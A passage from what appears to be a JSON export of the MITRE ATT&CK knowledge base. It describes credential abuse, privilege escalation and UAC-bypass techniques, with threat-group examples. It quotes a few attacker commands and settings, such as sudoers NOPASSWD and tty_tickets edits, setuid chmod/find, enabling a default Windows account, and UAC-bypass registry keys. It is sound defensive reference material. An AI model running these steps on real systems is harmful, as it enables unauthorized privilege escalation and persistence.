"G0085", "name": "FIN4", "description": "FIN4 has used legitimate credentials to hijack email communications."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has used legitimate VPN, RDP, Citrix, or VNC credentials to maintain access to a victim environment."}, {"id": "G0037", "name": "FIN6", "description": "To move laterally on a victim network, FIN6 has used credentials stolen from various systems on which it gathered usernames and password hashes."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has harvested valid administrative credentials for lateral movement."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used valid accounts for persistence and lateral movement."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has used valid credentials with various services during lateral movement."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM leveraged valid accounts to maintain access to a victim network."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used a compromised Exchange account to search mailboxes and create new Exchange accounts."}, {"id": "G1032", "name": "INC Ransom", "description": "INC Ransom has used compromised valid accounts for access to victim environments."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has used valid accounts for initial access and lateral movement. Indrik Spider has also maintained access to the victim environment through the VPN infrastructure."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer can use supplied user credentials to execute processes and stop services."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used credential dumpers or stealers to obtain legitimate credentials, which they used to gain access to victim accounts."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has used valid SSH credentials to access remote hosts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials and/or session tokens to gain access into a victim's VPN, VDI, RDP, and IAMs."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has used administrator credentials to gain access to restricted network segments."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has obtained valid accounts to gain initial access."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit acquires valid SSH accounts through brute force. "}, {"id": "G0045", "name": "menuPass", "description": "menuPass has used valid accounts including shared between Managed Service Providers and clients to move between the two environments."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used compromised VPN accounts to gain access to victim systems."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used compromised credentials to access other systems on a victim network."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used valid VPN credentials to gain initial access."}, {"id": "G0011", "name": "PittyTiger", "description": "PittyTiger attempts to obtain legitimate credentials during operations."}, {"id": "G1040", "name": "Play", "description": "Play has used valid VPN accounts to achieve initial access."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has used valid compromised credentials to gain access to victim environments."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team have used previously acquired legitimate credentials prior to attacks."}, {"id": "S0053", "name": "SeaDuke", "description": "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials."}, {"id": "G0091", "name": "Silence", "description": "Silence has used compromised credentials to log on to other systems and escalate privileges."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has used compromised credentials to obtain unauthorized access to online accounts."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used different compromised credentials for remote access and to move laterally."}, {"id": "G1033", "name": "Star Blizzard", "description": "Star Blizzard has used stolen credentials to sign into victim email accounts."}, {"id": "G0039", "name": "Suckfly", "description": "Suckfly used legitimate account credentials that they dumped to navigate the internal victim network as though they were the legitimate account owner."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon relies primarily on valid credentials for persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used valid credentials for privileged accounts with the goal of accessing domain controllers."}], "sub_techniques": [{"name": "Default Accounts", "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.", "detailed_description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.\nDefault accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.", "id": "T1078.001", "examples": [{"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has abused default user names and passwords in externally-accessible IP cameras for initial access."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used the built-in administrator account to move laterally using RDP and Impacket."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can use default credentials to connect to IPC$ shares on remote machines."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound enabled and used the default system managed account, DefaultAccount, via \"powershell.exe\" /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet infected WinCC machines via a hardcoded database server password."}]}, {"name": "Domain Accounts", "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.", "detailed_description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.", "id": "T1078.002", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius attempted to acquire valid credentials for victim environments through various means to enable follow-on lateral movement."}, {"id": "G0022", "name": "APT3", "description": "APT3 leverages valid accounts after gaining credentials for use within the victim domain."}, {"id": "G1023", "name": "APT5", "description": "APT5 has used legitimate account credentials to move laterally through compromised environments."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda used multiple mechanisms to capture valid user accounts for victim domains to enable lateral movement and access to additional hosts in victim environments."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used compromised domain accounts to gain access to the target environment."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has obtained highly privileged credentials such as domain administrator in order to deploy malware."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a domain user account."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can use stolen credentials to authenticate on target networks."}, {"id": "C0029", "name": "Cutting Edge", "description": "During Cutting Edge, threat actors used compromised VPN accounts for lateral movement on targeted networks."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has collected credentials from infected systems, including domain accounts."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used domain administrator accounts after dumping LSASS process memory."}, {"id": "G0019", "name": "Naikon", "description": "Naikon has used administrator credentials for lateral movement in compromised networks."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used domain accounts to gain further access to victim systems."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors used compromised domain administrator credentials as part of their lateral movement."}, {"id": "C0023", "name": "Operation Ghost", "description": "For Operation Ghost, APT29 used stolen administrator credentials for lateral movement on compromised networks."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid domain accounts for access."}, {"id": "S0446", "name": "Ryuk", "description": "Ryuk can use stolen domain admin accounts to move laterally within a victim domain."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has used stolen credentials to access administrative accounts within the domain."}, {"id": "S0140", "name": "Shamoon", "description": "If Shamoon cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet attempts to access network resources with a domain account\u2019s credentials."}, {"id": "G0092", "name": "TA505", "description": "TA505 has used stolen domain admin accounts to compromise additional hosts."}, {"id": "G0028", "name": "Threat Group-1314", "description": "Threat Group-1314 actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used compromised domain admin credentials to mount local network shares."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has used compromised domain accounts to authenticate to devices on compromised networks."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has used administrative accounts, including Domain Admin, to move laterally within a victim network."}]}, {"name": "Local Accounts", "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.", "detailed_description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\nLocal Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.", "id": "T1078.003", "examples": [{"id": "G0016", "name": "APT29", "description": "APT29 targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 has used legitimate local admin account credentials."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use known credentials to run commands and spawn processes as a local user account."}, {"id": "S0367", "name": "Emotet", "description": "Emotet can brute force a local admin password, then use it to facilitate lateral movement."}, {"id": "G0051", "name": "FIN10", "description": "FIN10 has moved laterally using the Local Administrator account."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has used compromised credentials for access as SYSTEM on Exchange servers."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP."}, {"id": "S0368", "name": "NotPetya", "description": "NotPetya can use valid credentials with PsExec or wmic to spread itself to remote systems."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation."}, {"id": "G1040", "name": "Play", "description": "Play has used valid  local accounts to gain initial access."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created admin accounts on a compromised host."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used compromised local accounts to access victims' networks."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has used known administrator account credentials to execute the backdoor directly."}, {"id": "G0010", "name": "Turla", "description": "Turla has abused local accounts that have the same password across the victim\u2019s network."}, {"id": "S0221", "name": "Umbreon", "description": "Umbreon creates valid local users to provide access to the system."}]}, {"name": "Cloud Accounts", "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. ", "detailed_description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. \nService or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.\nAn adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication.\nCloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.", "id": "T1078.004", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes."}, {"id": "G0016", "name": "APT29", "description": "APT29 has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints."}, {"id": "G1023", "name": "APT5", "description": "APT5 has accessed Microsoft M365 cloud environments using stolen credentials. "}, {"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang has used compromised credentials to sign into victims\u2019 Microsoft 365 accounts."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has used compromised credentials to access cloud assets within a target organization."}, {"id": "S1091", "name": "Pacu", "description": "Pacu leverages valid cloud accounts to perform most of its operations."}, {"id": "S0683", "name": "Peirates", "description": "Peirates can use stolen service account tokens to perform its operations."}, {"id": "S0684", "name": "ROADTools", "description": "ROADTools leverages valid cloud credentials to perform enumeration operations using the internal Azure AD Graph API."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used a compromised O365 administrator account to create a new Service Principal."}]}]}]}, {"name": "Defense Evasion", "description": "The adversary is trying to avoid being detected.Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics\u2019 techniques are cross-listed here when those techniques include the added benefit of subverting defenses.", "id": "TA0005", "techniques": [{"name": "Abuse Elevation Control Mechanism", "description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.", "detailed_description": "Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.", "id": "T1548", "examples": [{"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin implements a variation of the ucmDccwCOMMethod technique abusing the Windows AutoElevate backdoor to bypass UAC while elevating privileges."}], "sub_techniques": [{"name": "Setuid and Setgid", "description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.", "detailed_description": "An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user\u2019s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.\nInstead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. Linux and Mac File and Directory Permissions Modification). The chmod command can set these bits with bitmasking, chmod 4777 [file] or via shorthand naming, chmod u+s [file]. This will enable the setuid bit. To enable the setgid bit, chmod 2775 and chmod g+s can be used.\nAdversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future. This abuse is often part of a \"shell escape\" or other actions to bypass an execution environment with restricted permissions.\nAlternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. File and Directory Discovery). The setuid and setguid bits are indicated with an \"s\" instead of an \"x\" when viewing a file's attributes via ls -l. The find command can also be used to search for such files. For example, find / -perm +4000 2>/dev/null can be used to find files with setuid set and find / -perm +2000 2>/dev/null may be used for setgid. Binaries that have these bits set may then be abused by adversaries.", "id": "T1548.001", "examples": [{"id": "S0401", "name": "Exaramel for Linux", "description": "Exaramel for Linux can execute commands with high privileges via a specific binary with setuid functionality."}, {"id": "S0276", "name": "Keydnap", "description": "Keydnap adds the setuid flag to a binary so it can easily elevate in the future."}]}, {"name": "Bypass User Account Control", "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.", "detailed_description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated Component Object Model objects without prompting the user through the UAC notification box. An example of this is use of Rundll32 to load a specifically crafted DLL which loads an auto-elevated Component Object Model object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.", "id": "T1548.002", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has presented the user with a UAC prompt to elevate privileges while installing."}, {"id": "G0016", "name": "APT29", "description": "APT29 has bypassed UAC."}, {"id": "G0067", "name": "APT37", "description": "APT37 has a function in the initial dropper to bypass Windows UAC in order to execute the next payload with higher privileges."}, {"id": "S0129", "name": "AutoIt backdoor", "description": "AutoIt backdoor attempts to escalate privileges by bypassing User Access Control."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon bypasses UAC using the CMSTPLUA COM interface."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit has attempted to bypass UAC and gain elevated administrative privileges."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can utilize the CMSTPLUA COM interface and the SilentCleanup task to bypass UAC."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can suppress UAC prompts by setting the HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command registry key on Windows 10 or HKCU\\Software\\Classes\\mscfile\\shell\\open\\command on Windows 7 and launching the eventvwr.msc process, which launches BitPaymer with elevated privileges."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat can bypass UAC to escalate privileges."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later."}, {"id": "G0060", "name": "BRONZE BUTLER", "description": "BRONZE BUTLER has used a Windows 10 specific tool and xxmm to bypass UAC for privilege escalation."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee has the ability to bypass UAC to deploy post exploitation tools with elevated privileges."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can make use of the Windows SilentCleanup scheduled task to execute its payload with elevated privileges."}, {"id": "S0660", "name": "Clambling", "description": "Clambling has the ability to bypass UAC using a passuac.dll file."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has bypassed UAC."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use a number of known techniques to bypass Windows UAC."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can bypass UAC using the SilentCleanup task to execute the binary with elevated privileges."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses two distinct User Account Control (UAC) bypass techniques to escalate privileges."}, {"id": "S0134", "name": "Downdelph", "description": "Downdelph bypasses UAC to escalate privileges by using a custom \"RedirectEXE\" shim database."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used the Fodhelper UAC bypass technique to gain elevated privileges."}, {"id": "S0363", "name": "Empire", "description": "Empire includes various modules to attempt to bypass UAC for escalation of privileges."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum has used PowerShell to bypass UAC."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher performs UAC bypass."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can bypass UAC to elevate process privileges on a compromised host."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can bypass UAC by registering as the default handler for .MSC files."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe)."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can use fileless UAC bypass and create an elevated COM object to escalate privileges."}, {"id": "S0250", "name": "Koadic", "description": "Koadic has 2 methods for elevating integrity. It can bypass UAC through eventvwr.exe and sdclt.exe."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS will perform UAC bypass either through fodhelper.exe or eventvwr.exe."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has bypassed UAC by performing token impersonation as well as an RPC-based method, this included bypassing UAC set to \"AlwaysNotify\"."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has utilized multiple techniques to bypass UAC."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater uses various techniques to bypass UAC."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used the malicious NTWDBLIB.DLL and cliconfig.exe to bypass UAC protections."}, {"id": "G0040", "name": "Patchwork", "description": "Patchwork bypassed User Access Control (UAC)."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon installer can use UAC bypass techniques to install the payload."}, {"id": "S0254", "name": "PLAINTEE", "description": "An older variant of PLAINTEE performs UAC bypass."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can utilize multiple methods to bypass UAC."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can generate a UAC pop-up Window to prompt the target user to run a command as the administrator."}, {"id": "S0458", "name": "Ramsay", "description": "Ramsay can use UACMe for privilege escalation."}, {"id": "S1130", "name": "Raspberry Robin", "description": "Raspberry Robin will use the legitimate Windows utility fodhelper.exe to run processes at elevated privileges without requiring a User Account Control prompt."}, {"id": "S0662", "name": "RCSession", "description": "RCSession can bypass UAC to escalate privileges."}, {"id": "S0332", "name": "Remcos", "description": "Remcos has a command for UAC bypassing."}, {"id": "S0148", "name": "RTM", "description": "RTM can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges."}, {"id": "S1018", "name": "Saint Bot", "description": "Saint Bot has attempted to bypass UAC using fodhelper.exe to escalate privileges."}, {"id": "S0074", "name": "Sakula", "description": "Sakula contains UAC bypass code for both 32- and 64-bit systems."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon attempts to disable UAC remote restrictions by modifying the Registry."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has hijacked the cryptbase.dll within migwiz.exe to escalate privileges. This prevented the User Access Control window from appearing."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY contains a number of modules that can bypass UAC, including through Window's Device Manager, Manage Optional Features, and an image hijack on the .msc file extension."}, {"id": "G0027", "name": "Threat Group-3390", "description": "A Threat Group-3390 tool can use a public UAC bypass method to elevate privileges."}, {"id": "S0116", "name": "UACMe", "description": "UACMe contains many methods for bypassing Windows User Account Control on multiple versions of the operating system."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can use sdclt.exe to bypass UAC in Windows 10 to escalate privileges; for older Windows versions WarzoneRAT can use the IFileOperation exploit to bypass the UAC module."}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows can use a variant of the sysprep UAC bypass."}, {"id": "S0230", "name": "ZeroT", "description": "Many ZeroT samples can perform UAC bypass by using eventvwr.exe to execute a malicious file."}]}, {"name": "Sudo and Sudo Caching", "description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.", "detailed_description": "Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.\nWithin Linux and MacOS systems, sudo (sometimes referred to as \"superuser do\") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The sudo command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" Since sudo was made for the system administrator, it has some useful configuration features such as a timestamp_timeout, which is the amount of time in minutes between instances of sudo before it will re-prompt for a password. This is because sudo has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at /var/db/sudo with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a tty_tickets variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\nThe sudoers file, /etc/sudoers, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like user1 ALL=(ALL) NOPASSWD: ALL. Elevated privileges are required to edit this file though.\nAdversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, /var/db/sudo's timestamp can be monitored to see if it falls within the timestamp_timeout range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if tty_tickets is disabled, adversaries can do this from any tty for that user.\nIn the wild, malware has disabled tty_tickets to potentially make scripting easier by issuing echo \\'Defaults !tty_tickets\\' >> /etc/sudoers. In order for this change to be reflected, the malware also issued killall Terminal. As of macOS Sierra, the sudoers file has tty_tickets enabled by default.", "id": "T1548.003", "examples": [{"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can use sudo to run a command."}, {"id": "S0281", "name": "Dok", "description": "Dok adds admin  ALL=(ALL) NOPASSWD: ALL to the /etc/sudoers file."}, {"id": "S0279", "name": "Proton", "description": "Proton modifies the tty_tickets line in the sudoers file."}]}, {"name": "Elevated Execution with Prompt", "description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.", "detailed_description": "Adversaries may leverage the AuthorizationExecuteWithPrivileges API to escalate privileges by prompting the user for credentials. The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.\nAlthough this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.\nAdversaries may abuse AuthorizationExecuteWithPrivileges to obtain root privileges in order to install malicious software on victims and install persistence mechanisms. This technique may be combined with Masquerading to trick the user into granting escalated privileges to malicious code. This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.", "id": "T1548.004", "examples": [{"id": "S0402", "name": "OSX/Shlayer", "description": "OSX/Shlayer can escalate privileges to root by asking the user for credentials."}]}, {"name": "Temporary Elevated Cloud Access", "description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own.", "detailed_description": "Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may 